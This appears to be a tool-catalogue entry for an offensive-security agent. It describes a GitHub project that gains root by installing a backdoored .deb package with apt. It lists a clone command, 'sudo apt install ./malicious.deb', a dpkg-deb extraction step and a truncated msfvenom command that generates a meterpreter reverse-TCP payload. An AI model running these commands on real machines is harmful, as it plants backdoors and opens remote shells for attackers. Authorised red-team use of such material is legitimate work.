documentation.when_to_use: Use during the 'post_exploit' phase against surfaces [web, shell_windows, shell_linux] in the Command and Control category. Fits when the engagement needs: Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.
documentation.why_to_use: Prefer this tool based on upstream description: Exploiting apt install to Gain Root Access via Malicious .deb Packages.
documentation.how_to_use: Install/setup: git clone https://github.com/abdulrafayishaCkER/apt-root-backdoor.git. Run the primary entrypoint as shown in upstream docs, e.g. `sudo apt install ./malicious.deb`. Further invocations from upstream: `dpkg-deb -R filesearch_1.0.deb extracted/`; `msfvenom -p python/meterpreter_reverse_tcp \`. Exploiting apt install to Gain Root Access via Malicious .deb Packages.
